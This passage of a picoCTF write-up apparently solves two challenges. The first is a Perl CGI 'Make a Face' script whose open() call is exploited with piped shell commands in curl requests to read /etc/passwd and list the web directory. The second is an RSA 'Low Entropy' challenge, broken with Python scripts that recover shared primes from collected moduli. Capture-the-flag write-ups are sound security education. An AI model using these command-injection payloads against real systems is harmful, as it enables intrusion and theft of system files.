<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class='perl'><span class='line'><span class="c1">#!/usr/bin/perl</span>
</span><span class='line'>
</span><span class='line'><span class="k">use</span> <span class="n">CGI</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="nv">$q</span> <span class="o">=</span> <span class="k">new</span> <span class="n">CGI</span><span class="p">;</span>
</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="nb">defined</span><span class="p">(</span><span class="nv">$q</span><span class="o">-&gt;</span><span class="n">param</span><span class="p">(</span><span class="s">&#39;Head&#39;</span><span class="p">)))</span> <span class="p">{</span>
</span><span class='line'>  <span class="k">print</span> <span class="nv">$q</span><span class="o">-&gt;</span><span class="n">header</span><span class="p">(</span><span class="o">-</span><span class="n">type</span><span class="o">=&gt;</span><span class="s">&#39;image/bmp&#39;</span><span class="p">);</span>
</span><span class='line'>  <span class="nb">open</span><span class="p">(</span><span class="n">HEAD</span><span class="p">,</span><span class="s">&quot;head&quot;</span><span class="o">.</span><span class="nv">$q</span><span class="o">-&gt;</span><span class="n">param</span><span class="p">(</span><span class="s">&#39;Head&#39;</span><span class="p">));</span>
</span><span class='line'>  <span class="nb">open</span><span class="p">(</span><span class="n">HAIR</span><span class="p">,</span><span class="s">&quot;hair&quot;</span><span class="o">.</span><span class="nv">$q</span><span class="o">-&gt;</span><span class="n">param</span><span class="p">(</span><span class="s">&#39;Hair&#39;</span><span class="p">));</span>
</span><span class='line'>  <span class="nb">open</span><span class="p">(</span><span class="n">NOSE</span><span class="p">,</span><span class="s">&quot;nose&quot;</span><span class="o">.</span><span class="nv">$q</span><span class="o">-&gt;</span><span class="n">param</span><span class="p">(</span><span class="s">&#39;Nose&#39;</span><span class="p">));</span>
</span><span class='line'>  <span class="nb">open</span><span class="p">(</span><span class="n">MOUTH</span><span class="p">,</span><span class="s">&quot;mouth&quot;</span><span class="o">.</span><span class="nv">$q</span><span class="o">-&gt;</span><span class="n">param</span><span class="p">(</span><span class="s">&#39;Mouth&#39;</span><span class="p">));</span>
</span><span class='line'>  <span class="nb">open</span><span class="p">(</span><span class="n">EYES</span><span class="p">,</span><span class="s">&quot;eyes&quot;</span><span class="o">.</span><span class="nv">$q</span><span class="o">-&gt;</span><span class="n">param</span><span class="p">(</span><span class="s">&#39;Eyes&#39;</span><span class="p">));</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">while</span> <span class="p">(</span><span class="nb">read</span><span class="p">(</span><span class="n">HEAD</span><span class="p">,</span><span class="nv">$headb</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>    <span class="nb">read</span><span class="p">(</span><span class="n">HAIR</span><span class="p">,</span><span class="nv">$hairb</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'>    <span class="nb">read</span><span class="p">(</span><span class="n">NOSE</span><span class="p">,</span><span class="nv">$noseb</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'>    <span class="nb">read</span><span class="p">(</span><span class="n">MOUTH</span><span class="p">,</span><span class="nv">$mouthb</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'>    <span class="nb">read</span><span class="p">(</span><span class="n">EYES</span><span class="p">,</span><span class="nv">$eyesb</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'>    <span class="k">print</span> <span class="p">(</span><span class="nb">chr</span> <span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="nv">$headb</span><span class="p">)</span><span class="o">&amp;</span><span class="nb">ord</span><span class="p">(</span><span class="nv">$hairb</span><span class="p">)</span><span class="o">&amp;</span><span class="nb">ord</span><span class="p">(</span><span class="nv">$noseb</span><span class="p">)</span><span class="o">&amp;</span><span class="nb">ord</span><span class="p">(</span><span class="nv">$mouthb</span><span class="p">)</span><span class="o">&amp;</span><span class="nb">ord</span><span class="p">(</span><span class="nv">$eyesb</span><span class="p">)));</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="k">else</span> <span class="p">{</span>
</span><span class='line'>  <span class="k">print</span> <span class="nv">$q</span><span class="o">-&gt;</span><span class="n">header</span><span class="p">;</span>
</span><span class='line'>  <span class="o">...</span><span class="n">generate</span> <span class="n">page</span><span class="o">...</span>
</span></code></pre></td></tr></table></div></figure>


<p>We can&rsquo;t really inject anything into the parameter fields, as the value is concatenated with &ldquo;head&rdquo;, &ldquo;hair&rdquo;, etc. No calls to <code>system</code> or <code>eval</code> are made, no backticks were used. However, perl being perl, has another <a href="http://www.cgisecurity.com/lib/sips.html">trick up it&rsquo;s sleeve</a>:</p>

<p><code>
If the filename begins with "|", the filename is interpreted as a command to which output is to be piped, and if the filename ends with a "|", the filename is interpreted as a command which pipes output to us.
</code></p>

<p>That&rsquo;s handy! Let&rsquo;s try it:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~<span class="nv">$ </span>curl <span class="s2">&quot;http://makeaface.picoctf.com/index.cgi?Head=%20/etc/passwd|&amp;Hair=1.bmp&amp;Nose=2.bmp&amp;Mouth=2.bmp&amp;Eyes=3.bmp&quot;</span>
</span><span class='line'>BM....binnologin
</span><span class='line'>sync:x:4:65534:sync:/bin:/bin/sync
</span><span class='line'>games:x:5:60:games:/usr/games:/usr/sbin/nologin
</span><span class='line'>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
</span><span class='line'>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
</span><span class='line'>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
</span><span class='line'>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
</span></code></pre></td></tr></table></div></figure>


<p>It returns a few lines of /etc/passwd, albeit mangled a bit. This works, because the &ldquo;head&rdquo; parameter is used in the open statement like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='perl'><span class='line'><span class="nb">open</span><span class="p">(</span><span class="n">HEAD</span><span class="p">,</span><span class="s">&quot;head /etc/passwd|&quot;</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>This makes perl believe that it is a command from which we want to see output! From here, we enumerated the webdirectory and Swappage came up with the brilliant solution:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~<span class="nv">$ </span>curl <span class="s2">&quot;http://makeaface.picoctf.com/index.cgi?Head=%20|cat%20/etc/passwd%26%26ls%20-la|&amp;Hair=1.bmp&amp;Nose=2.bmp&amp;Mouth=2.bmp&amp;Eyes=3.bmp&quot;</span>
</span><span class='line'>BM...hex bytes...binnologin
</span><span class='line'>sync:x:4:65534:sync:/bin:/bin/sync
</span><span class='line'>games:x:5:60:games:/usr/games:/usr/sbin/nologin
</span><span class='line'>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
</span><span class='line'>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
</span><span class='line'>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
</span><span class='line'>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
</span><span class='line'>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
</span><span class='line'>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
</span><span class='line'>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
</span><span class='line'>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
</span><span class='line'>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
</span><span class='line'>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
</span><span class='line'>gnats:x:41:41:Gnats Bug-Reporting System <span class="o">(</span>admin<span class="o">)</span>:/var/lib/gnats:/usr/sbin/nologin
</span><span class='line'>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
</span><span class='line'>libuuid:x:100:101::/var/lib/libuuid:
</span><span class='line'>syslog:x:101:104::/home/syslog:/bin/false
</span><span class='line'>messagebus:x:102:106::/var/run/dbus:/bin/false
</span><span class='line'>landscape:x:103:109::/var/lib/landscape:/bin/false
</span><span class='line'>sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
</span><span class='line'>pollinate:x:105:1::/var/cache/pollinate:/bin/false
</span><span class='line'>ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
</span><span class='line'>total 228
</span><span class='line'>drwxr-xr-x <span class="m">2</span> root root <span class="m">4096</span> Oct <span class="m">27</span> 03:57 .
</span><span class='line'>drwxr-xr-x <span class="m">3</span> root root <span class="m">4096</span> Oct <span class="m">27</span> 03:47 ..
</span><span class='line'>-rw-r--r-- <span class="m">1</span> root root   <span class="m">34</span> Oct <span class="m">27</span> 03:48 SECRET_KEY_2b609783951a8665d8c67d721b52b0f8
</span><span class='line'>-rw-r--r-- <span class="m">1</span> root root  <span class="m">452</span> Oct <span class="m">27</span> 03:48 css.css
</span><span class='line'>-rw-r--r-- <span class="m">1</span> root root <span class="m">8338</span> Oct <span class="m">27</span> 03:48 eyes1.bmp
</span><span class='line'>-rw-r--r-- <span class="m">1</span> root root <span class="m">8338</span> Oct <span class="m">27</span> 03:48 eyes2.bmp
</span><span class='line'>-rw-r--r-- <span class="m">1</span> root root <span class="m">8338</span> Oct <span class="m">27</span> 03:48 eyes3.bmp
</span><span class='line'>-rw-r--r-- <span class="m">1</span> root root <span class="m">8338</span> Oct <span class="m">27</span> 03:48 eyes4.bmp
</span><span class='line'>-rw-r--r-- <span class="m">1</span> root root <span class="m">8338</span> Oct <span class="m">27</span> 03:48 hair0.bmp
</span></code></pre></td></tr></table></div></figure>


<p>Because that file, <code>SECRET_KEY_2b609783951a8665d8c67d721b52b0f8</code> is world-readable and in the webdirectory, we could just browse to it and grab the flag: <code>why_did_we_stop_using_perl_again?</code></p>

<h1>Low Entropy (110 points)</h1>

<p>We are given a server to connect to and a pcap file. We need to decrypt the message found in the pcap file. This message was encoded with a private RSA key.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>Welcome to the Thyrin drop box. Please send your public key and message.
</span><span class='line'>Public key: c20a1d8b3903e1864d14a4d1f32ce57e4665fc5683960d2f7c0f30d5d247f5fa264fa66b49e801943ab68be3d9a4b393ae22963888bf145f07101616e62e0db2b04644524516c966d8923acf12af049a1d9d6fe3e786763613ee9b8f541291dcf8f0ac9dccc5d47565ef332d466bc80dc5763f1b1139f14d3c0bae072725815f
</span><span class='line'>Message: 49f573321bdb3ad0a78f0e0c7cd4f4aa2a6d5911c90540ddbbaf067c6aabaccde78c8ff70c5a4abe7d4efa19074a5249b2e6525a0168c0c49535bc993efb7e2c221f4f349a014477d4134f03413fd7241303e634499313034dbb4ac96606faed5de01e784f2706e85bf3e814f5f88027b8aeccf18c928821c9d2d830b5050a1e
</span></code></pre></td></tr></table></div></figure>


<p>The server spits out the product of two primes, which gives us a lot of possible public keys. We need to find the factors <code>p</code> and <code>q</code>, the factors of the captured public key. If we have those factors, it&rsquo;s game over. Luckily, the server has only 30 primes to choose from. That means that there are 30 * 29 / 2 = 435 possible keys. Let&rsquo;s first grab all these products of <code>p</code> and <code>q</code> and store them:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class='line'>
</span><span class='line'><span class="k">while</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">products</span><span class="p">)</span><span class="o">&lt;</span><span class="mi">30</span><span class="o">*</span><span class="mi">29</span><span class="p">):</span>
</span><span class='line'>  <span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;vuln2014.picoctf.com&#39;</span><span class="p">,</span><span class="mi">51818</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>  <span class="c"># banner</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">pq</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">256</span><span class="p">)</span>
</span><span class='line'>  <span class="n">pq</span> <span class="o">=</span> <span class="nb">long</span><span class="p">(</span><span class="s">&quot;0&quot;</span><span class="o">+</span><span class="n">pq</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="k">if</span> <span class="n">pq</span> <span class="ow">and</span> <span class="ow">not</span> <span class="n">pq</span> <span class="ow">in</span> <span class="n">products</span><span class="p">:</span>
</span><span class='line'>      <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">&#39;public_keys&#39;</span><span class="p">,</span> <span class="s">&#39;a&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span><span class='line'>          <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">pq</span><span class="p">)</span><span class="o">+</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'>      <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>              
</span><span class='line'>      <span class="n">products</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">pq</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="k">print</span> <span class="s">&quot;Now at {} products...&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">products</span><span class="p">))</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>This should grab the 435 unique public keys. Next, we need to find the primes that constitute the captured public key. Basically, we have a list of <code>a1*a2, a1*a3, a2*a3...</code> for 30 unique primes. Let&rsquo;s assume the captured public key is derived from the values <code>a1</code> and <code>a2</code>. Given a large list of other values ax*ay and some math, we can say that there are values that satisfy:</p>

<p><code>
(a1*a2 / (a1*a3) * a2*a3 == a2*a2
</code></p>

<p>Therefore, we can extract the squared values of each prime! I skipped using <code>math.sqrt()</code> and python <code>float</code> values, as these do not have the required precision given these extremely large numbers. Let&rsquo;s generate all these squared values from each key we got from the server. Then, divide the square of the public key by each entry. If the result is also in the list of squared primes, then we have a match!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'>
</span><span class='line'><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">&#39;public_keys&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span><span class='line'>  <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">readlines</span><span class="p">()</span>
</span><span class='line'>  <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>  
</span><span class='line'><span class="n">alice_key</span> <span class="o">=</span> <span class="mh">0xc20a1d8b3903e1864d14a4d1f32ce57e4665fc5683960d2f7c0f30d5d247f5fa264fa66b49e801943ab68be3d9a4b393ae22963888bf145f07101616e62e0db2b04644524516c966d8923acf12af049a1d9d6fe3e786763613ee9b8f541291dcf8f0ac9dccc5d47565ef332d466bc80dc5763f1b1139f14d3c0bae072725815f</span>
</span><span class='line'>
</span><span class='line'><span class="n">public_keys</span> <span class="o">=</span> <span class="nb">set</span><span class="p">([])</span>
</span><span class='line'><span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
</span><span class='line'>  <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">line</span><span class="o">.</span><span class="n">strip</span><span class="p">()):</span>
</span><span class='line'>      <span class="n">public_keys</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">line</span><span class="o">.</span><span class="n">strip</span><span class="p">()))</span>
</span><span class='line'>  
</span><span class='line'><span class="n">squares</span> <span class="o">=</span> <span class="nb">set</span><span class="p">([])</span>    <span class="c"># sets are fast :)</span>
</span><span class='line'><span class="k">for</span> <span class="n">key_a</span> <span class="ow">in</span> <span class="n">public_keys</span><span class="p">:</span>
</span><span class='line'>  <span class="k">for</span> <span class="n">key_b</span> <span class="ow">in</span> <span class="n">public_keys</span> <span class="o">-</span> <span class="nb">set</span><span class="p">([</span><span class="n">key_a</span><span class="p">]):</span>
</span><span class='line'>      <span class="n">squares</span><span class="o">.</span><span class="n">add</span><span class="p">((</span><span class="n">alice_key</span> <span class="o">*</span> <span class="n">key_a</span><span class="p">)</span> <span class="o">/</span> <span class="n">key_b</span><span class="p">)</span>
</span><span class='line'>      
</span><span class='line'><span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="n">squares</span><span class="p">:</span>
</span><span class='line'>  <span class="n">l</span> <span class="o">=</span> <span class="n">alice_key</span><span class="o">**</span><span class="mi">2</span> <span class="o">/</span> <span class="n">k</span>
</span><span class='line'>  <span class="k">if</span> <span class="n">l</span> <span class="ow">in</span> <span class="n">squares</span><span class="p">:</span>
</span><span class='line'>      <span class="k">if</span> <span class="n">alice_key</span><span class="o">**</span><span class="mi">2</span> <span class="o">==</span> <span class="n">l</span><span class="o">*</span><span class="n">k</span><span class="p">:</span> <span class="c"># double-check to prevent rounding errors</span>
</span><span class='line'>          <span class="k">print</span> <span class="s">&quot;[!] Found k={}</span><span class="se">\n</span><span class="s">l={}</span><span class="se">\n</span><span class="s">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">k</span><span class="p">,</span> <span class="n">l</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>It should return two values for k and l (because k could be l and vice-versa):</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="o">[</span>!<span class="o">]</span> Found <span class="nv">k</span><span class="o">=</span>145636797632612493383437910621935492258871220486831431433846443881029756884131014317442568196356163696603884037401628766885574744524908524694664229202327755975190209777333222305357215356711196812874146485202755534755335009504417851499146840024376285929565498060947342673068738915934424594894642178132393803401
</span><span class='line'><span class="nv">l</span><span class="o">=</span>127485391417645634265899520100348459764415230949848696681516013917289651283750339673156991958225605417057264644648275442237083380079695308054967054357615028357457990698626856902554884944611614631356998904650004684028810140797701724207511157802310732003918967758266191880635014381653257954124503965122532941561
</span></code></pre></td></tr></table></div></figure>


<p>Now, all we have to do is take the square root of these values to get <code>p</code> and <code>q</code>! Luckily, <a href="http://stackoverflow.com/questions/15390807/integer-square-root-in-python/15391420#15391420">Newton&rsquo;s algorithm</a> works perfectly for integers. The server gave us the public exponent (2<sup>16</sup>+1) so we are all set for decrypting the message:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">isqrt</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
</span><span class='line'>    <span class="n">x</span> <span class="o">=</span> <span class="n">n</span>
</span><span class='line'>    <span class="n">y</span> <span class="o">=</span> <span class="p">(</span><span class="n">x</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
</span><span class='line'>    <span class="k">while</span> <span class="n">y</span> <span class="o">&lt;</span> <span class="n">x</span><span class="p">:</span>
</span><span class='line'>        <span class="n">x</span> <span class="o">=</span> <span class="n">y</span>
</span><span class='line'>        <span class="n">y</span> <span class="o">=</span> <span class="p">(</span><span class="n">x</span> <span class="o">+</span> <span class="n">n</span> <span class="o">//</span> <span class="n">x</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">x</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">egcd</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">):</span>
</span><span class='line'>  <span class="k">if</span> <span class="n">a</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span><span class='line'>      <span class="k">return</span> <span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
</span><span class='line'>  <span class="k">else</span><span class="p">:</span>
</span><span class='line'>      <span class="n">g</span><span class="p">,</span> <span class="n">y</span><span class="p">,</span> <span class="n">x</span> <span class="o">=</span> <span class="n">egcd</span><span class="p">(</span><span class="n">b</span> <span class="o">%</span> <span class="n">a</span><span class="p">,</span> <span class="n">a</span><span class="p">)</span>
</span><span class='line'>      <span class="k">return</span> <span class="p">(</span><span class="n">g</span><span class="p">,</span> <span class="n">x</span> <span class="o">-</span> <span class="p">(</span><span class="n">b</span> <span class="o">//</span> <span class="n">a</span><span class="p">)</span> <span class="o">*</span> <span class="n">y</span><span class="p">,</span> <span class="n">y</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">modinv</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">m</span><span class="p">):</span>
</span><span class='line'>  <span class="n">g</span><span class="p">,</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span> <span class="o">=</span> <span class="n">egcd</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">m</span><span class="p">)</span>
</span><span class='line'>  <span class="k">if</span> <span class="n">g</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">:</span>
</span><span class='line'>      <span class="k">raise</span> <span class="ne">Exception</span><span class="p">(</span><span class="s">&#39;modular inverse does not exist&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="k">else</span><span class="p">:</span>
</span><span class='line'>      <span class="k">return</span> <span class="n">x</span> <span class="o">%</span> <span class="n">m</span>
</span><span class='line'>      
</span><span class='line'><span class="n">e</span> <span class="o">=</span> <span class="mi">2</span><span class="o">**</span><span class="mi">16</span><span class="o">+</span><span class="mi">1</span>
</span><span class='line'><span class="n">k</span> <span class="o">=</span> <span class="mi">127485391417645634265899520100348459764415230949848696681516013917289651283750339673156991958225605417057264644648275442237083380079695308054967054357615028357457990698626856902554884944611614631356998904650004684028810140797701724207511157802310732003918967758266191880635014381653257954124503965122532941561</span>
</span><span class='line'><span class="n">l</span> <span class="o">=</span> <span class="mi">145636797632612493383437910621935492258871220486831431433846443881029756884131014317442568196356163696603884037401628766885574744524908524694664229202327755975190209777333222305357215356711196812874146485202755534755335009504417851499146840024376285929565498060947342673068738915934424594894642178132393803401</span>
</span><span class='line'>
</span><span class='line'><span class="n">p</span> <span class="o">=</span> <span class="n">isqrt</span><span class="p">(</span><span class="n">k</span><span class="p">)</span>
</span><span class='line'><span class="n">q</span> <span class="o">=</span> <span class="n">isqrt</span><span class="p">(</span><span class="n">l</span><span class="p">)</span>
</span><span class='line'><span class="n">c</span> <span class="o">=</span> <span class="mh">0x49f573321bdb3ad0a78f0e0c7cd4f4aa2a6d5911c90540ddbbaf067c6aabaccde78c8ff70c5a4abe7d4efa19074a5249b2e6525a0168c0c49535bc993efb7e2c221f4f349a014477d4134f03413fd7241303e634499313034dbb4ac96606faed5de01e784f2706e85bf3e814f5f88027b8aeccf18c928821c9d2d830b5050a1e</span>
</span><span class='line'>
</span><span class='line'><span class="n">n</span> <span class="o">=</span> <span class="n">p</span><span class="o">*</span><span class="n">q</span>
</span><span class='line'><span class="n">tot</span> <span class="o">=</span> <span class="p">(</span><span class="n">p</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="p">(</span><span class="n">q</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
</span><span class='line'><span class="n">d</span> <span class="o">=</span> <span class="n">modinv</span><span class="p">(</span><span class="n">e</span><span class="p">,</span> <span class="n">tot</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">m</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="n">d</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">m</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>This gives us the decoded hexadecimal representation of the message. Running it through <code>xxd</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tmp/picoctf/low_entropy<span class="nv">$ </span>python solve.py
